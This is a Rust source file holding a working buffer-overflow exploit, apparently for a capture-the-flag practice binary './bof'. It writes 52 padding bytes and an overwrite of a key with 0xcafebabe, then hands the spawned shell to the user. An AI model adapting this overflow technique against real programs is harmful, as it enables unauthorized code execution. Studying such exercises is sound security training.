use std::io::{self, copy, Write};
use std::process::{Command, Stdio};
use std::thread;

// component trait
trait Component {
    fn process(&mut self) -> io::Result<()>;
}

// payload generator component
struct PayloadGenerator {
    output: Vec<u8>,
}

impl PayloadGenerator {
    fn new() -> Self {
        PayloadGenerator { output: Vec::new() }
    }

    fn get_output(&mut self) -> Vec<u8> {
        std::mem::take(&mut self.output)
    }
}

impl Component for PayloadGenerator {
    fn process(&mut self) -> io::Result<()> {
        // 52 bytes of padding ('0') + 4-byte key overwrite (\xbe\xba\xfe\xca) + newline ('\n')
        let mut payload = Vec::new();
        payload.extend(vec![b'0'; 52]); // 52 padding bytes
        payload.extend(&[0xbe, 0xba, 0xfe, 0xca]); // overwrite key with 0xcafebabe
        payload.push(b'\n'); // append newline to terminate input
        self.output = payload;
        Ok(())
    }
}

// process manager component
struct ProcessManager {
    payload: Vec<u8>,
}

impl ProcessManager {
    fn new() -> Self {
        ProcessManager {
            payload: Vec::new(),
        }
    }

    fn set_payload(&mut self, payload: Vec<u8>) {
        self.payload = payload;
    }
}

impl Component for ProcessManager {
    fn process(&mut self) -> io::Result<()> {
        // spawn the vulnerable process (`./bof`)
        let mut child = Command::new("./bof")
            .stdin(Stdio::piped()) // write to its stdin
            .stdout(Stdio::inherit()) // inherit stdout to see program outputs directly
            .stderr(Stdio::inherit()) // inherit stderr for error messages
            .spawn()?; // spawn the process

        // handle writing the payload and maintaining interaction
        if let Some(mut stdin) = child.stdin.take() {
            // clone the payload for use in the thread
            let payload_clone = self.payload.clone();

            // spawn a new thread to handle writing to the child's stdin
            thread::spawn(move || {
                // write the initial payload
                stdin
                    .write_all(&payload_clone)
                    .expect("Failed to write payload");

                // switch to interactive mode by copying from the user's stdin
                let mut user_input = io::stdin();
                let mut child_stdin = stdin;
                // use `copy` to forward user input to the child's stdin
                // this allows interaction with the spawned shell
                if let Err(e) = copy(&mut user_input, &mut child_stdin) {
                    eprintln!("Error while forwarding input: {}", e);
                }
            });
        }

        // wait for the child process to exit
        child.wait()?;
        Ok(())
    }
}

// network coordinator
struct Network {
    payload_generator: PayloadGenerator,
    process_manager: ProcessManager,
}

impl Network {
    fn new() -> Self {
        Network {
            payload_generator: PayloadGenerator::new(),
            process_manager: ProcessManager::new(),
        }
    }

    fn run(&mut self) -> io::Result<()> {
        // generate the exploit payload
        self.payload_generator.process()?;
        let payload = self.payload_generator.get_output();

        // send payload to process manager and execute
        self.process_manager.set_payload(payload);
        self.process_manager.process()?;

        Ok(())
    }
}

fn main() -> io::Result<()> {
    let mut network = Network::new();
    network.run()
}
